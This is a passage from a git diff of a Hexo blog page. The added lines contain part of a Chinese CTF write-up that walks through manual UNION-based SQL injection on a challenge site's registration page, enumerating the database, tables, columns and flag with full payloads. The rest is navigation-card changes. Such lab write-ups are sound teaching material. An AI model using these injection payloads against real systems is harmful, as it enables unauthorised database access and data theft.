+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119140717528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>获得flag：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119140816549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119141246891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><p>这道题的提示是sqli，那就注入吧，从它的注册页面下手，这道题最狗的就是它的回显内容，你得登录以后才能显示在<strong>年龄</strong>上，先来判断字段长度：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119145204986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>长度为4<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119145823949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>回显位在2：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119150121428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆库：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span>'union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token shell-comment comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111915065969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>爆表：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span>'union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> from information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span><span class="token number">0x74657374</span><span class="token shell-comment comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119160800228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆列：</p>
+<pre class="line-numbers language-php"><code class="language-php">' union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> from information_schema<span class="token punctuation">.</span>columns where table_name<span class="token operator">=</span><span class="token number">0x666C61616167</span><span class="token shell-comment comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119162406590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆数据：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span>' union select <span class="token number">1</span><span class="token punctuation">,</span>fl44g<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> from flaaag<span class="token shell-comment comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119162740481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -868,7 +964,7 @@ skip_render:
                     </span>
                     <a href="https://Erikten.github.io" class="b-link-green">Erikten</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/posts/17fd92ae.html" class="b-link-green">Hexo之渲染绕过</a>
+                    <a href="/posts/d067edb.html" class="b-link-green">第三届山东新一代信息安全攻防赛——Web题目wp</a>
                 </p>
             </div>
 
@@ -1224,31 +1320,31 @@ skip_render:
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/posts/e178bb2.html">
+                <a href="/posts/17fd92ae.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/13.jpg" class="responsive-img" alt="BeesCMS4.0多处漏洞复现">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/11.jpg" class="responsive-img" alt="Hexo之渲染绕过">
                         
-                        <span class="card-title">BeesCMS4.0多处漏洞复现</span>
+                        <span class="card-title">Hexo之渲染绕过</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            2020易霖博杯 Re题目部分Writeup
+                            在Hexo部署时会默认渲染source下的所有html页面，但有时候想在Hexo博客上单独自定义html页面或README.md时，却不希望被Hexo渲染。
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-06-05
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-04-28
                         </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/代码审计篇/" class="post-category" target="_blank">
-                                    代码审计篇
+                            <a href="/categories/博客篇/" class="post-category" target="_blank">
+                                    博客篇
                                 </a>
                             
                             
@@ -1258,24 +1354,12 @@ skip_render:
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/代码审计/" target="_blank">
-                        <span class="chip bg-color">代码审计</span>
+                    <a href="/tags/Hexo/" target="_blank">
+                        <span class="chip bg-color">Hexo</span>
                     </a>
                     
-                    <a href="/tags/Exp/" target="_blank">
-                        <span class="chip bg-color">Exp</span>
-                    </a>
-                    
-                    <a href="/tags/PHP/" target="_blank">
-                        <span class="chip bg-color">PHP</span>
-                    </a>
-                    
-                    <a href="/tags/0day/" target="_blank">
-                        <span class="chip bg-color">0day</span>
-                    </a>
-                    
-                    <a href="/tags/漏洞复现/" target="_blank">
-                        <span class="chip bg-color">漏洞复现</span>
+                    <a href="/tags/渲染绕过/" target="_blank">
+                        <span class="chip bg-color">渲染绕过</span>
                     </a>
                     
                 </div>
@@ -1289,24 +1373,24 @@ skip_render:
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/d067edb.html">
+                <a href="/posts/34ae5c62.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/12.jpg" class="responsive-img" alt="第三届山东新一代信息安全攻防赛——Web题目wp">
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/09.jpg" class="responsive-img" alt="2020易霖博杯——Re题目部分WP">
                         
-                        <span class="card-title">第三届山东新一代信息安全攻防赛——Web题目wp</span>
+                        <span class="card-title">2020易霖博杯——Re题目部分WP</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            第三届山东新一代信息安全攻防赛  Web题目Writeup
+                            2020易霖博杯 Re题目部分Writeup
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-20
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-15
                             </span>
                         <span class="publish-author">
                             
@@ -1323,24 +1407,24 @@ skip_render:
                 
                 <div class="card-action article-tags">
                     
+                    <a href="/tags/易霖博杯/" target="_blank">
+                        <span class="chip bg-color">易霖博杯</span>
+                    </a>
+                    
                     <a href="/tags/CTF/" target="_blank">
                         <span class="chip bg-color">CTF</span>
                     </a>
                     
+                    <a href="/tags/C/" target="_blank">
+                        <span class="chip bg-color">C</span>
+                    </a>
+                    
+                    <a href="/tags/Re/" target="_blank">
+                        <span class="chip bg-color">Re</span>
+                    </a>
+                    
                     <a href="/tags/代码审计/" target="_blank">
                         <span class="chip bg-color">代码审计</span>
-                    </a>
-                    
-                    <a href="/tags/PHP/" target="_blank">
-                        <span class="chip bg-color">PHP</span>
-                    </a>
-                    
-                    <a href="/tags/EXP/" target="_blank">
-                        <span class="chip bg-color">EXP</span>
-                    </a>
-                    
-                    <a href="/tags/Bugku/" target="_blank">
-                        <span class="chip bg-color">Bugku</span>
                     </a>
                     
                 </div>
